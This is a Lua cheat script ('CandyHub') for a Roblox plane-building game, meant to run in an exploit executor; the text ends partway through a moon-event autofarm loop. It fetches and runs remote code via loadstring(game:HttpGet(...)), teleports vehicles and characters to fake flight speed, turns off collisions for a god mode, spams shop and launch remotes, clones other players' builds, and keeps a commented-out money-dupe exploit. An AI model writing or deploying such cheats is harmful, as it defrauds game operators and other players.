print("4")
local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local supportedVersion = "v1.4.2"
local supportedVersionp = 1395
local scriptversion = "v1.8.5"

local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/depthso/Dear-ReGui/refs/heads/main/ReGui.lua'))()
local Window = ReGui:TabsWindow({
	Title = "[🍬] CandyHub - ".. name .. " " .. scriptversion,
	Size = UDim2.fromOffset(380, 440),
    NoClose = true
}) --> TabSelector & WindowClass

local function modal(title, description, call)
    local modalw = ReGui:PopupModal({
        Title = title,

    })
    modalw:Label({
        Text = "\n"..description.."\n",
        TextWrapped = true
    })
    local Row = modalw:Row({
        Expanded = true
    })
    Row:Button({
        Text = "Cancel",
        Callback = function()
            modalw:ClosePopup()
        end,
    })
    Row:Button({
        Text = "Continue",
        Callback = function(self)
            modalw:ClosePopup()
            task.spawn(call)
        end,
    })
    return modalw
end
if isfile and readfile and listfiles and writefile and makefolder then
    if not isfolder("CandyHub\\Builds") then
        makefolder("CandyHub\\Builds")
    end
else
    print("filing system unsupported")
end
if not _G.candyhub then _G.candyhub = {
    autofarm = false,
    moon = false,
    x = 17000,
    y = 160,
    endpos = 100000,
    allitems = true,
    maxfps = 0,
    mode = "SuperFast",
    autotake = true,
    items = {
        propeller_2 = false,
        shield = false,
        fuel_1 = false,
        block_1 = false,
        wing_1 = false,
        missile_1 = false,
        fuel_3 = false,
        boost_1 = false,
        fuel_2 = false,
        balloon = false,
        seat_1 = false,
        wing_2 = false,
        propeller_1 = false,
    },
    distance = 100000,
    autobuy = false,
    lags = false,
    gm = false,
    nofall = false,
    posy = 60,
    abs = false,
    afk = false,
    fillscreen = false,
    fpschanger = false,
}end

local abs = function(num)
    if num ~= 0 then
        return -num
    end
    return num
end
local function getplot()
    local plots = workspace.Islands
    for i, plot in plots:GetChildren() do
        if plot.Important.OwnerID.Value == game.Players.LocalPlayer.UserId then
            return plot
        end
    end
end

local plot = getplot()
local spawnpart = plot:WaitForChild("SpawnPart")
local spawnpartpos = spawnpart.Position
local spawnpartcfr = spawnpart.CFrame

local function getitems()
    local items = {}
    for i, item in game:GetService("Players").LocalPlayer.PlayerGui.Main.BlockShop.Shop.Container.ScrollingFrame:GetChildren() do
        if item.Name ~= "ExtraScrollPadding" and item.Name ~= "TemplateFrame" and item.ClassName == "Frame" then
            table.insert(items, item.Name)
        end
    end
    return items
end

_G.filetarget = ""

local function place(name,x,y,z)
    local args = {
        name,
        {
            target = plot:FindFirstChild("Plot"),
            hitPosition = vector.create(x,y,z), -- -6.59358024597168, 59, -312.9150390625
            targetSurface = Enum.NormalId.Top
        }
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("BuildingEvents"):WaitForChild("PlaceBlock"):FireServer(unpack(args))
end
print("5:99")


local function simulatetable()
    local zip = {}
    for i, item in plot:FindFirstChild("PlacedBlocks"):GetChildren() do
        table.insert(zip, 
            {
                item.Name,
                {
                    item.PrimaryPart.Position.X,
                    item.PrimaryPart.Position.Y,
                    item.PrimaryPart.Position.Z
                }
            }
        )
    end
    return zip
end

local function simulatetable2()
    local zip = {}
    for i, item in plot:FindFirstChild("PlacedBlocks"):GetChildren() do

        local plotn = plot.Name:gsub("Island","")
        local ploti = tonumber(plotn)-1
        
        print(plotn)
        print(plot.Name:gsub("Island",""))
        print(ploti)

        local x,y,z = item.PrimaryPart.Position.X,item.PrimaryPart.Position.Y,item.PrimaryPart.Position.Z
        z = z + (85*ploti)
        print(vector.create(x,y,z))

        table.insert(zip, 
            {
                item.Name,
                {
                    x,
                    y,
                    z
                }
            }
        )
    end
    return zip
end

local function readbuild(name)
    local fixedname = name:gsub("CandyHub\\Builds","")
    fixedname = fixedname:gsub("Candyhub/Builds","")
    fixedname = fixedname:gsub("/","")
    fixedname = fixedname:gsub("CandyHubBuilds", "")
    fixedname = fixedname:gsub(".json","")

    local path = "CandyHub\\Builds\\"..fixedname..".json"
    return readfile(path)
end

local function decode(table)
    return game:GetService("HttpService"):JSONDecode(table)
end

local function encode(table)
    return game:GetService("HttpService"):JSONEncode(table)
end

local function save(name,table)

    local fixedname = name:gsub("CandyHub\\Builds","")
    fixedname = fixedname:gsub("Candyhub/Builds","")
    fixedname = fixedname:gsub("/","")
    fixedname = fixedname:gsub("CandyHubBuilds", "")
    fixedname = fixedname:gsub(".json","")

    local path = "CandyHub\\Builds\\"..fixedname..".json"
    writefile(path,encode(table))
end

local function load(name)

    local path = "CandyHub\\Builds\\"..name..".json"

    if isfile(path) then
        return decode(readfile(path))
    else
        return nil
    end
end

local function loadpath(path)

    local path = path..".json"

    if isfile(path) then
        return decode(readfile(path))
    else
        return nil
    end
end

local function takeall()
    for _, it in plot.PlacedBlocks:GetChildren() do
        local i = it.PrimaryPart
        local args = {
            {
                target = i,
                hitPosition = vector.create(i.CFrame.p.X, i.CFrame.p.Y, i.CFrame.p.Z),
                targetSurface = Enum.NormalId.Left
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("BuildingEvents"):WaitForChild("GrabBlock"):FireServer(unpack(args))
    end
end

local function getblocks(zip)
    local blocks = {}

    for _, res in ipairs(zip) do
        local name = res[1]
        blocks[name] = blocks[name] or {}
        table.insert(blocks[name], res)
    end

    return blocks
end

local function hasresources(zip)
    local blocks = getblocks(zip)

    for name, blockList in pairs(blocks) do
        local inventoryItem = game.Players.LocalPlayer.Important.Inventory:FindFirstChild(name)
        if not inventoryItem or inventoryItem.Value < #blockList then
            return false
        end
    end

    return true
end

print("6:199")
local function loaddecoded(decoded)
    for i, item in decoded do
        task.spawn(function()

            local plotn = plot.Name:gsub("Island","")
            local ploti = tonumber(plotn)-1
            local itemname = item[1]
            local x = item[2][1]
            local y = item[2][2]
            local z = (tonumber(item[2][3]) or 0) - tonumber((85*ploti)) -- fix: default to 0 if nil

            place(itemname,x,y,z)
        end)
    end
end

local function savecfg()
    writefile("CandyHub\\Config.json",encode(_G.candyhub))
end

local function loadcfg()
    if isfile("CandyHub\\Config.json") then
        _G.candyhub = decode(readfile("CandyHub\\Config.json"))
    end
end

loadcfg()

-- game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("PortalTouched"):FireServer()

local function getseat(blocks)
    local x = nil
    for i, item in blocks:GetChildren() do
        if string.find(item.Name, "driver_seat") then x = item end
    end
    return x
end

local function alive()
    if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 then
                return true
            end
        end 
    end
    return false
end

local function char()
    if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 then
                return game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            end
        end 
    end
    return nil
end

local function plane()
    local x = (plot.PlacedBlocks:FindFirstChild("driver_seat_1") or plot.PlacedBlocks:FindFirstChild("driver_seat_2") or plot.PlacedBlocks:FindFirstChild("driver_seat_3") or plot.PlacedBlocks:FindFirstChild("driver_seat_4")) or nil
    if x == nil then 
        return false
    elseif x:FindFirstChild("Hitbox") and x:FindFirstChildOfClass("VehicleSeat") then
        if x:FindFirstChildOfClass("VehicleSeat"):FindFirstChild("BodyGyro") then
            return true
        end
    end
    return false
end

local function getoffseat()
    local seat = seat or getseat(plot.PlacedBlocks)
    if seat and seat:FindFirstChildOfClass("VehicleSeat") then
        if seat:FindFirstChildOfClass("VehicleSeat").Occupant ~= nil then
            seat:FindFirstChildOfClass("VehicleSeat").Disabled = true
            seat:FindFirstChildOfClass("VehicleSeat").Disabled = false
        end
    end
end

local Main = Window:CreateTab({Name = "Main"})
local f1 = Main:CollapsingHeader({Title="Main",Collapsed=false}) --> Canvas
local my = Main:CollapsingHeader({Title="Stats",Collapsed=false});my:SetVisible(false)
local my1 = my:Label({Text = "Money Earned: 0"})
local my2 = my:Label({Text = "Time: 0h 0m 0s"})

--local debug = Window:CreateTab({Name = "DEBUG"})
--local dbg = debug:CollapsingHeader({Title="consol"})
print("7:297")
f1:Checkbox({
	Value = _G.candyhub.autofarm,
	Label = "Auto Fly (Default Map)",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.autofarm =v
            savecfg()

            my:SetVisible(_G.candyhub)
            if _G.candyhub.autofarm then
                local money = game:GetService("Players").LocalPlayer.leaderstats.Cash.Value
                local runnin= math.floor(tick())
                task.spawn(function()
                    while _G.candyhub.autofarm and task.wait(0.1) do
                        if ((not game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value and _G.candyhub.moon) or not _G.candyhub.moon) then
                            my1.Text = ("Money Earned: " .. tostring(abs(money-game:GetService("Players").LocalPlayer.leaderstats.Cash.Value)))
                            my2.Text = ("Time: " .. tostring(math.floor((math.floor(tick())-runnin)/3600)) .. "h " .. tostring(math.floor(((math.floor(tick())-runnin)%3600)/60)) .. "m " .. tostring(math.floor((math.floor(tick())-runnin)%60)) .. "s")
                        end
                    end
                end)
            end

            while _G.candyhub.autofarm and task.wait(.1) do
                --dbg:Label({Text = "bds1"})
                if ((not game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value and _G.candyhub.moon) or not _G.candyhub.moon) then
                local aplane = plot.PlacedBlocks
                local driver = (aplane:FindFirstChild("driver_seat_1") or aplane:FindFirstChild("driver_seat_2") or aplane:FindFirstChild("driver_seat_3"))
                local launched = plot.Important.Launched

                local x,z = spawnpartpos.X, spawnpartpos.Z

                --dbg:Label({Text = "bds2"})

                if not alive() then
                    repeat task.wait(0.1) until alive()
                end

                if driver == nil then
                    repeat
                        task.wait(1) 
                    until (aplane:FindFirstChild("driver_seat_1") or aplane:FindFirstChild("driver_seat_2") or aplane:FindFirstChild("driver_seat_3")) ~= nil or not _G.candyhub.autofarm
                    driver = (aplane:FindFirstChild("driver_seat_1") or aplane:FindFirstChild("driver_seat_2") or aplane:FindFirstChild("driver_seat_3"))
                end

                if not driver:FindFirstChild("Hitbox") then
                    repeat 
                        --dbg:Label({Text = "bds66"}) 
                        task.wait(0.05) 
                    until driver:FindFirstChild("Hitbox") or not _G.candyhub.autofarm
                end
                repeat 
                    --dbg:Label({Text = "bds77"})
                    if not launched.Value and alive() then
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch"):FireServer()
                    end 
                    task.wait(1)
                until launched.Value or not _G.candyhub.autofarm
                task.wait(0.35)
                local abc = true
                --dbg:Label({Text = "abc1"})
                while launched.Value and _G.candyhub.autofarm and (plane() and alive()) and abc and ((not game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value and _G.candyhub.moon) or not _G.candyhub.moon) do
                    --task.spawn(function()
                    --dbg:Label({Text = "abc2"})
                    if plane() and alive() then
                        --dbg:Label({Text = "abc3"})
                        local target = driver:FindFirstChild("Hitbox") or game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        target.CFrame = CFrame.new(
                            Vector3.new(
                                target.Position.X + (_G.candyhub.x / 100),
                                _G.candyhub.y,
                                z
                            ),
                            Vector3.new(
                                target.Position.X + ((_G.candyhub.x + 10) / 100),
                                _G.candyhub.y,
                                z
                            )
                        )
                        --dbg:Label({Text = "abc4"})

                        if (target.Position.X >= _G.candyhub.endpos) then
                            abc = false
                        end
                        --dbg:Label({Text = "abc5"})
                    end --end)
                    --dbg:Label({Text = "abc6"})
                    task.wait(0.001)
                end
                --dbg:Label({Text = "abc7"})
                task.wait(1)
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return"):FireServer()
                --dbg:Label({Text = "abc8"})
                end
            end

        end)
	end
})
print("8:396")
f1:Checkbox({
    Value = _G.candyhub.gm,
    Label = "GodMode",
    Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.gm =v
            savecfg()

            while _G.candyhub.gm and task.wait(.4) do
                for i, item in plot:FindFirstChild("PlacedBlocks"):GetDescendants() do
                    if item.ClassName == "Part" or item.ClassName == "MeshPart" and (item.Parent.Name ~= "driver_seat_1" and item.Name ~= "Part") then
                        if item.CanTouch then
                            item.CanTouch = false
                        end
                    end
                end
            end
            for i, item in plot:FindFirstChild("PlacedBlocks"):GetDescendants() do
                if item.ClassName == "Part" or item.ClassName == "MeshPart" and (item.Parent.Name ~= "driver_seat_1" and item.Name ~= "Part") then
                    item.CanTouch = true
                end
            end
        end)
    end
})

savecfg()

f1:Checkbox({
    Value = _G.candyhub.nofall,
    Label = "NoFall (Wont go down)",
    Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.nofall =v
            savecfg()
            while _G.candyhub.nofall and task.wait(.01) do
                local HumanoidRootPart = char()
                if HumanoidRootPart ~= nil and plot.Important.Launched.Value then
                    if HumanoidRootPart.Position.Y < _G.candyhub.posy and HumanoidRootPart ~= nil and plot.Important.Launched.Value then
                        HumanoidRootPart.CFrame += Vector3.new(0,1,0)
                    end
                end
            end
        end)
	end
})

f1:SliderInt({
    Label = "No Fall Y",
    Value = _G.candyhub.posy,
    Minimum = 10,
    Maximum = 500,
    Callback = function(self, v: Int)
        task.spawn(function()
            _G.candyhub.posy=v;savecfg() 
        end)
    end
})

f1:SliderInt({
    Label = "Y",
    Value = _G.candyhub.y,
    Minimum = -50,
    Maximum = 500,
    Callback = function(self, v: Int)
        task.spawn(function()
            _G.candyhub.y=v;savecfg() 
        end)
    end
})

f1:SliderInt({
    Label = "UnNatural SpeedUP",
    Value = _G.candyhub.x,
    Minimum = 0,
    Maximum = 20000,
    Callback = function(self, v: Int)
        task.spawn(function()
            _G.candyhub.x=v;savecfg() 
        end)
    end
})

f1:InputInt({
    Label = "Distance To End",
    Value = _G.candyhub.endpos,
    Maximum = 10000000,
    Minimum = 500,
    Callback = function(self, v: Int)
        task.spawn(function()
            _G.candyhub.endpos=v;savecfg()
        end)
    end
})

local info123 = f1:Label({Text = "\n RECCOMENDED SPEEDUP: 17500+-\n IF SPEEDUP IS DETECTED YOU WONT GET REWARDS\n NEED MORE PROPELLERS FOR MORE SPD \n"})
info123.TextColor3 = Color3.fromRGB(100,100,245)

print("9:500")
--[[
local f2 = Main:CollapsingHeader({Title="Dupe (PATCHED)"}) --> Canvas
f2:Label({Text="the more distance give, more money you get."})
f2:Button({
	Text = "Complete",
	Callback = function(self)

        local plot = getplot()
        local spawn = getplot():FindFirstChild("SpawnPart")

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch"):FireServer()
        task.wait(0.6)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
            _G.candyhub.distance,
            spawn.Position.Y + 25,
            spawn.Position.Z
        )
        task.wait(0.2)
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return"):FireServer()
	end
})

f2:InputInt({
    Label = "Distance",
    Value = 100000,
    Maximum = 9999999999999,
    Minimum = 0,
    Callback = function(self, v: number)
        _G.candyhub.distance=v;savecfg()
    end
})]]
--local f64 = Main:CollapsingHeader({Title="Flight"}) --> Canvas
--[[
f64:Checkbox({
	Value = false,
	Label = "Spam SaveSlot 1",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.lags=v;savecfg()
            while _G.candyhub.lags and task.wait() do
                task.spawn(function()
                    local args = {
                        1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("BuildingEvents"):WaitForChild("use_slot"):InvokeServer(unpack(args))
                end)
            end
        end)
	end
})]]

local f3 = Main:CollapsingHeader({Title="Auto Buy",Collapsed=false})
local b663 

f3:Checkbox({
	Value = _G.candyhub.autobuy,
	Label = "Auto Buy Items",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.autobuy=v;savecfg()
            while _G.candyhub.autobuy and task.wait(0.1) do
                if _G.candyhub.allitems then
                    local items = getitems()
                    for i, item in ipairs(items) do
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShopEvents"):WaitForChild("BuyBlock"):FireServer(
                            item
                        )
                    end
                else
                    for i, item in _G.candyhub.items do
                        if item then
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShopEvents"):WaitForChild("BuyBlock"):FireServer(
                                i
                            )
                        end
                    end
                end
            end
        end)
	end
})

f3:Checkbox({
	Value = _G.candyhub.allitems,
	Label = "All Items",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.allitems=v;savecfg()
            if b663 ~= nil then b663:SetVisible(not _G.candyhub.allitems) end
        end)
	end
})
b663 = f3:CollapsingHeader({Title="Items",Collapsed = false});b663:SetVisible(false)
for i, item in getitems() do
    b663:Checkbox({
        Value = _G.candyhub.items[item],
        Label = item,
        Callback = function(self, v: boolean)
            task.spawn(function()
                _G.candyhub.items[item]=v;savecfg()
            end)
        end
    })
end
print("10:605")


local bsa = Window:CreateTab({Name = "Build"})

local bs1 = bsa:CollapsingHeader({Title="Build (WIP)",NoArrow = true,OpenOnArrow = true,Collapsed=false})

if not (isfile and writefile and readfile and listfiles and makefolder) then
    local label = bs1:Label({Text="your executor doesnt support\nfiles/file system"})
    label.TextColor3 = Color3.fromRGB(225,50,20)
end

local bs1 = bsa:CollapsingHeader({Title="Build ",NoArrow = true,OpenOnArrow = true,Collapsed=false})


if isfile and writefile and readfile and listfiles and makefolder then
bs1:InputText({
    Label = "File Name",
    Value = "",
    Placeholder = "file name. . .",
    MultiLine = false,
    Callback = function(self, v: string)
        _G.filetarget=v;savecfg()
    end
})

if not isfolder("CandyHub\\Builds") then
    makefolder("CandyHub\\Builds")
end

bs1:Combo({
	Label = "Files",
	Selected = "",
	GetItems = function()
        local items = {}
        for ___, item in ipairs(listfiles("CandyHub\\Builds")) do
            local fixedname = item:gsub("CandyHub\\Builds\\","")
            fixedname = fixedname:gsub("CandyHub/Builds","")
            fixedname = fixedname:gsub("\\","");fixedname=fixedname:gsub("/","")
            fixedname = fixedname:gsub("CandyHubBuilds", "")
            fixedname = fixedname:gsub(".json","")
            table.insert(items,fixedname)
        end
        return items
	end,
    Callback = function(self, v)
        --loaddecoded(load(v))
        _G.filetarget = v
    end
})

local row1 = bs1:Row({
    Expanded = true
})

row1:Button({
	Text = "load build",
	Callback = function(self)
        local items = {}
        for i, item in listfiles("CandyHub\\Builds\\") do
            local fixedname = item:gsub("CandyHub\\Builds\\","")
            fixedname = fixedname:gsub("CandyHub/Builds","")
            fixedname = fixedname:gsub("\\","");fixedname=fixedname:gsub("/","")
            fixedname = fixedname:gsub("CandyHubBuilds", "")
            fixedname = fixedname:gsub(".json","")
            table.insert(items,fixedname)
        end

        if table.find(items,_G.filetarget) then
            if hasresources(load(_G.filetarget)) then
                if _G.candyhub.autotake then
                    takeall()
                    repeat task.wait() until #plot.PlacedBlocks:GetChildren() == 0
                end
                loaddecoded(load(_G.filetarget))
            else
                local blocks = getblocks(load(_G.filetarget))
                local hasAny = false
                for _ in pairs(blocks) do
                    hasAny = true
                    break
                end
                if type(blocks) == "table" and hasAny then
                    local function getblocks(zip)
                        local blocks = {}

                        for _, res in ipairs(resources) do
                            local name = res[1]
                            blocks[name] = blocks[name] or {}
                            table.insert(blocks[name], res)
                        end

                        return blocks
                    end

                    local popup = ReGui:PopupModal({
                        Title = "Need More Blocks.",
                    })

                    for name, blockList in pairs(blocks) do
                        --print(name .. " blocks: " .. tostring(#blockList))
                        if game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value >= #blockList then
                            popup:Label({
                                Text = name..": [" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value) .. "/" .. tostring(#blockList) .. "] (COMPLETE)"
                            })
                        else
                            popup:Label({
                                Text = name..": [" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value) .. "/" .. tostring(#blockList) .. "]"
                            })
                        end
                    end

                    local Row = popup:Row({
                        Expanded = true
                    })
                    Row:Button({
                        Text = "Ok",
                        Callback = function()
                            popup:ClosePopup()
                        end,
                    })
                else
                    local popup = ReGui:PopupModal({
                        Title = "Save Error",
                    })
                    popup:Label({
                        Text = "\n This Save Doesnt contain any blocks. \n"
                    })
                    local Row = popup:Row({
                        Expanded = true
                    })
                    Row:Button({
                        Text = "Ok",
                        Callback = function()
                            popup:ClosePopup()
                        end,
                    })
                end
            end
        else
            local popup = ReGui:PopupModal({
                Title = "Error",
            })
            popup:Label({
                Text = "\n This Save Doesnt Exist \n"
            })
            local Row = popup:Row({
                Expanded = true
            })
            Row:Button({
                Text = "Ok",
                Callback = function()
                    popup:ClosePopup()
                end,
            })
        end
	end
})


row1:Button({
	Text = "save",
	Callback = function(self)
        save(_G.filetarget,simulatetable2())
	end
})

bs1:Button({
	Text = "copy selected file",
	Callback = function(self)
        setclipboard(readbuild(_G.filetarget))
        --save(_G.filetarget,simulatetable2())
	end
})

bs1:InputText({
    Label = "json",
    Value = "",
    Placeholder ='[["driver_seat_1",[1,2,3]]]',
    MultiLine = false,
    Callback = function(self, v: string)
        _G.json = v
    end
})

local row2 = bs1:Row({
    Expanded = true
})

row2:Button({
	Text = "load from json",
	Callback = function(self)
        if hasresources(decode(_G.json)) then
            if _G.candyhub.autotake then
                takeall()
                repeat task.wait() until #plot.PlacedBlocks:GetChildren() == 0
            end
            loaddecoded(decode(_G.json))
        else
            local blocks = getblocks(decode(_G.json))
            local hasAny = false
            for _ in pairs(blocks) do
                hasAny = true
                break
            end
            if type(blocks) == "table" and hasAny then
                local function getblocks(zip)
                    local blocks = {}

                    for _, res in ipairs(resources) do
                        local name = res[1]
                        blocks[name] = blocks[name] or {}
                        table.insert(blocks[name], res)
                    end

                    return blocks
                end

                local popup = ReGui:PopupModal({
                    Title = "Need More Blocks.",
                })

                for name, blockList in pairs(blocks) do
                    --print(name .. " blocks: " .. tostring(#blockList))
                    if not game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name) then
                        popup:Label({
                            Text = name..": DOESNT EXIST"
                        })
                    else
                        if game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value >= #blockList then
                            popup:Label({
                                Text = name..": [" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value) .. "/" .. tostring(#blockList) .. "] (COMPLETE)"
                            })
                        else
                            popup:Label({
                                Text = name..": [" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory:FindFirstChild(name).Value) .. "/" .. tostring(#blockList) .. "]"
                            })
                        end
                    end
                end

                local Row = popup:Row({
                    Expanded = true
                })
                Row:Button({
                    Text = "Ok",
                    Callback = function()
                        popup:ClosePopup()
                    end,
                })
            else
                local popup = ReGui:PopupModal({
                    Title = "Save Error",
                })
                popup:Label({
                    Text = "\n This Save Doesnt contain any blocks. \n"
                })
                local Row = popup:Row({
                    Expanded = true
                })
                Row:Button({
                    Text = "Ok",
                    Callback = function()
                        popup:ClosePopup()
                    end,
                })
            end
        end
	end
})

row2:Button({
	Text = "save from json",
	Callback = function(self)print("")
        save(_G.filetarget,decode(_G.json))
	end
})

bs1:Button({
	Text = "Take All Blocks",
	Callback = function(self)
        takeall()
	end
})

bs1:Checkbox({
	Value = true,
	Label = "Auto Take Blocks",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.autotake=v;savecfg()
        end)
	end
})
end

local bsdc15 = bs1:CollapsingHeader({Title="Copy Build",Collapsed=true})
local bsdc1 = bsdc15:CollapsingHeader({Title="Copy",NoArrow = false,OpenOnArrow = false,Collapsed=false})

local bsdc2 = bsdc15:CollapsingHeader({Title="blocks (WIP)",NoArrow = false,OpenOnArrow = false,Collapsed=false})
local labelsbsdc2 = {}



local bs2 = bsa:CollapsingHeader({Title="Informations/Data",Collapsed=false,NoArrow=true,OpenOnArrow=true})

bsdc1:Combo({
	Label = "Islands",
	Selected = "",
	GetItems = function()
        local items = {}
        for ___, island in workspace.Islands:GetChildren() do
            if island.Important.OwnerID.Value ~= 0 then

                for i, player in game.Players:GetChildren() do 
                    if player.UserId == island.Important.OwnerID.Value and player.Name ~= game.Players.LocalPlayer.Name then
                        table.insert(items,player.Name)
                    end
                end
            end
        end
        return items
	end,
    Callback = function(self, v)
        for ___, island in workspace.Islands:GetChildren() do
            for i, player in game.Players:GetChildren() do 
                if game.Players:FindFirstChild(player.Name).UserId == island.Important.OwnerID.Value then
                    _G.choosenisland = island.Name    
                end
            end
        end
    end
})

bsdc1:Button({
	Text = "build",
	Callback = function(self)
        if not workspace.Islands:FindFirstChild(_G.choosenisland).Important.Launched.Value then
            if _G.autotake then takeall() repeat task.wait(0.01) until #plot.PlacedBlocks:GetChildren() == 0 end
            for i, item in workspace.Islands:FindFirstChild(_G.choosenisland).PlacedBlocks:GetChildren() do
                local plotn = plot.Name:gsub("Island","")
                local ploti = tonumber(plotn)-1
                local itemname = item.Name
                local x = item.PrimaryPart.Position.X
                local y = item.PrimaryPart.Position.Y
                local z = item.PrimaryPart.Position.Z
                z = z - (85*ploti)

                place(itemname,x,y,z)
            end
        else warn("plane of selected player's island is flying, cant copy build.") end
    end
})

print("11:800")

local events = Window:CreateTab({Name = "Events"})
local me = events:CollapsingHeader({Title="Moon Event",Collapsed=false,NoArrow=true,OpenOnArrow=true})
local mi = events:CollapsingHeader({Title="Stats",Collapsed=false});mi:SetVisible(false)
local ml1 = mi:Label({Text = "Money Earned: 0"})
local ml2 = mi:Label({Text = "Moon Coins Earned: 0"})
local ml3 = mi:Label({Text = "Propeller Blood: 0"})
local ml4 = mi:Label({Text = "Wing Blood: 0"})
local ml5 = mi:Label({Text = "Time: 0h 0m 0s"})

me:Checkbox({
	Value = _G.candyhub.moon,
	Label = "Auto Farm Moon Coins",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.moon=v;savecfg()
            mi:SetVisible(_G.candyhub.moon)

            if _G.candyhub.moon then
                local money = game:GetService("Players").LocalPlayer.leaderstats.Cash.Value
                local moons = game:GetService("Players").LocalPlayer.Important.RedMoons.Value
                local propeller_blood = game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value
                local wing_blood = game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value
                local runnin= math.floor(tick())
                ml1.Text = ("Money Earned: " .. tostring(abs(money-game:GetService("Players").LocalPlayer.leaderstats.Cash.Value)))
                ml2.Text = ("Moon Coins Earned: " .. tostring(abs(moons-game:GetService("Players").LocalPlayer.Important.RedMoons.Value)))
                ml3.Text = ("Propeller Blood: " .. tostring(abs(propeller_blood-game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value) .. ")")
                ml4.Text = ("Wing Blood: " .. tostring(abs(wing_blood-game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value) .. ")")
                ml5.Text = ("Time: " .. tostring(math.floor((math.floor(tick())-runnin)/3600)) .. "h " .. tostring(math.floor(((math.floor(tick())-runnin)%3600)/60)) .. "m " .. tostring(math.floor((math.floor(tick())-runnin)%60)) .. "s")

                task.spawn(function()
                    while _G.candyhub.moon and task.wait(0.1) do
                        if (game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value) then
                            ml1.Text = ("Money Earned: " .. tostring(abs(money-game:GetService("Players").LocalPlayer.leaderstats.Cash.Value)))
                            ml2.Text = ("Moon Coins Earned: " .. tostring(abs(moons-game:GetService("Players").LocalPlayer.Important.RedMoons.Value)))
                            ml3.Text = ("Propeller Blood: " .. tostring(abs(propeller_blood-game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value) .. ")")
                            ml4.Text = ("Wing Blood: " .. tostring(abs(wing_blood-game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value) .. ")")
                            ml5.Text = ("Time: " .. tostring(math.floor((math.floor(tick())-runnin)/3600)) .. "h " .. tostring(math.floor(((math.floor(tick())-runnin)%3600)/60)) .. "m " .. tostring(math.floor((math.floor(tick())-runnin)%60)) .. "s")
                        end
                    end
                end)
            end

            while _G.candyhub.moon do
                local launched = plot.Important.Launched
                if (game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value) then
                    if not launched.Value and alive() then
                        repeat 
                            if not launched.Value and alive() then
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch"):FireServer()
                            end 
                            task.wait(1)
                        until launched.Value or not _G.candyhub.moon
                    end
                    if not game.Players.LocalPlayer:GetAttribute("InEvent") then
                        repeat
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("PortalTouched"):FireServer()
                            task.wait(1)
                            if _G.candyhub.mode == "SuperFast" then
                                getoffseat()
                                task.spawn(function()
                                    if alive() then for i = 1,8 do
                                        task.wait(0.2)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spawnpartcfr + Vector3.new(0,5,0)
                                    end end
                                end)
                            end
